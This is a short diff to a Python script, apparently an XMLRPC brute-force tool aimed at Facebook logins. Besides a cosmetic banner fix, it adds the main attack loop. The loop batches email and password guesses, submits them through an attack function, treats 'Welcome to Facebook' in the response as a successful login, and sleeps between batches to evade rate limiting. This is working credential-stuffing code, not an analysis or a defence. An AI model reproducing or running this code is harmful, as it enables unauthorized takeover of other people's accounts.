@@ -26,7 +26,7 @@ def banner(argv, usage=False, url=None, users=None):
     print(bcolors.OKBLUE +
           "        \ /       _  _  __    _  _    ___ __    __ _  _  __ __" + bcolors.ENDC)
     print(bcolors.OKBLUE +
-          "         X |V||  |_)|_)/     |_)|_)| | | |_    |_ / \|_)/  |_ " + bcolors.ENDC)
+          "         X |V||  |_)|_)/     |_)|_)| | | |_    |_ / \|_)/  |_" + bcolors.ENDC)
     print(bcolors.OKBLUE +
           '        / \| ||__| \|  \__   |_)| \|_| | |__   |  \_/| \\\__|__' + bcolors.ENDC)
     print(bcolors.OKBLUE + "" + bcolors.ENDC)
@@ -91,4 +91,13 @@ if __name__ == '__main__':
     entries = []
     for email in emails:
         print("email: %s" % email)
-        for num in range
+        for num in range(0, len(passwds)):
+            if len(entries) == PASSWD_PER_REQUEST:
+                if "Welcome to Facebook" in attack(entries):
+                    find_one(entries)
+                entries = []
+                time.sleep(WAIT_TIME)
+            entries.append({"email": email, "passwd": passwds[num]})
+        if "Welcome to Facebook" in attack(entries):
+            find_one(entries)
+        entries = []
